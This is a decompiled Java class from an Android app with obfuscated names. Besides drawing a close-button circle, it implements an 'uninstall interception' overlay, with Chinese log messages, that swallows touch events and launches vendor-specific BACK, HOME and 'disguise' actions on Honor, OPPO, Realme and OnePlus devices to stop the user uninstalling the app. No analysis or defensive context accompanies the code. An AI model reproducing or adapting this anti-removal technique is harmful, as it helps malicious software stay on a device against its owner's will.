package p000;

import android.graphics.Canvas;
import android.graphics.Paint;
import android.view.MotionEvent;
import android.view.View;
import com.storm.safe.rock.activity.PackageVerifyActivity;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import kotlin.jvm.internal.Ref$BooleanRef;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class am0 extends View {

    /* renamed from: a0 */
    public final /* synthetic */ int f43721a0 = 0;

    /* renamed from: a1 */
    public final Object f43722a1;

    /* renamed from: a2 */
    public final Object f43723a2;

    public am0(PackageVerifyActivity packageVerifyActivity, int i) {
        super(packageVerifyActivity);
        Paint paint = new Paint(1);
        paint.setColor(i);
        paint.setStyle(Paint.Style.FILL);
        this.f43722a1 = paint;
        Paint paint2 = new Paint(1);
        paint2.setColor(-1);
        paint2.setStyle(Paint.Style.STROKE);
        int i2 = PackageVerifyActivity.f51912a0;
        paint2.setStrokeWidth(packageVerifyActivity.m211185a1(3.0f));
        paint2.setStrokeCap(Paint.Cap.ROUND);
        this.f43723a2 = paint2;
    }

    @Override // android.view.View
    public boolean dispatchTouchEvent(MotionEvent motionEvent) {
        switch (this.f43721a0) {
            case 2:
                C0355a0 c0355a0 = (C0355a0) this.f43723a2;
                t60.m214695b6(motionEvent, "ev");
                if (motionEvent.getAction() == 0) {
                    Ref$BooleanRef ref$BooleanRef = (Ref$BooleanRef) this.f43722a1;
                    if (!ref$BooleanRef.f57622a0) {
                        ref$BooleanRef.f57622a0 = true;
                        c0355a0.m211946e0();
                        if (c0355a0.f53679b4) {
                            t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 荣耀设备 → 判断是否有[从桌面移除]");
                            new Thread(new nk1(c0355a0, 12)).start();
                        } else if (c0355a0.f53680b5) {
                            t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] OPPO/Realme/OnePlus → 并行：BACK+HOME + 伪装");
                            new Thread(new nk1(c0355a0, 13)).start();
                            new Thread(new nk1(c0355a0, 14)).start();
                        } else {
                            t60.m214714d6("UninstallProtectionMgr", "🛡️ [系统卸载拦截] 触摸拦截，并行：BACK + 伪装");
                            new Thread(new nk1(c0355a0, 15)).start();
                            new Thread(new nk1(c0355a0, 16)).start();
                        }
                    }
                }
                return true;
            default:
                return super.dispatchTouchEvent(motionEvent);
        }
    }

    @Override // android.view.View
    public void onDraw(Canvas canvas) {
        switch (this.f43721a0) {
            case 0:
                t60.m214695b6(canvas, "c");
                float width = getWidth() / 2.0f;
                float height = getHeight() / 2.0f;
                float width2 = getWidth() / 2.0f;
                canvas.drawCircle(width, height, width2, (Paint) this.f43722a1);
                float f = width2 * 0.32f;
                float f2 = width - f;
                float f3 = height - f;
                float f4 = width + f;
                float f5 = f + height;
                Paint paint = (Paint) this.f43723a2;
                canvas.drawLine(f2, f3, f4, f5, paint);
                canvas.drawLine(f4, f3, f2, f5, paint);
                break;
            case 1:
                t60.m214695b6(canvas, "c");
                float width3 = getWidth() / 2.0f;
                float height2 = getHeight() / 2.0f;
                float width4 = getWidth() / 2.0f;
                canvas.drawCircle(width3, height2, width4, (Paint) this.f43722a1);
                float f6 = width4 * 0.32f;
                float f7 = width3 - f6;
                float f8 = height2 - f6;
                float f9 = width3 + f6;
                float f10 = f6 + height2;
                Paint paint2 = (Paint) this.f43723a2;
                canvas.drawLine(f7, f8, f9, f10, paint2);
                canvas.drawLine(f9, f8, f7, f10, paint2);
                break;
            default:
                super.onDraw(canvas);
                break;
        }
    }

    public am0(dqtvuisjd dqtvuisjdVar, int i) {
        super(dqtvuisjdVar);
        Paint paint = new Paint(1);
        paint.setColor(i);
        paint.setStyle(Paint.Style.FILL);
        this.f43722a1 = paint;
        Paint paint2 = new Paint(1);
        paint2.setColor(-1);
        paint2.setStyle(Paint.Style.STROKE);
        paint2.setStrokeWidth(cm0.m210867a2(dqtvuisjdVar, 3.0f));
        paint2.setStrokeCap(Paint.Cap.ROUND);
        this.f43723a2 = paint2;
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public am0(Ref$BooleanRef ref$BooleanRef, C0355a0 c0355a0, dqtvuisjd dqtvuisjdVar) {
        super(dqtvuisjdVar);
        this.f43722a1 = ref$BooleanRef;
        this.f43723a2 = c0355a0;
        setBackgroundColor(0);
    }
}
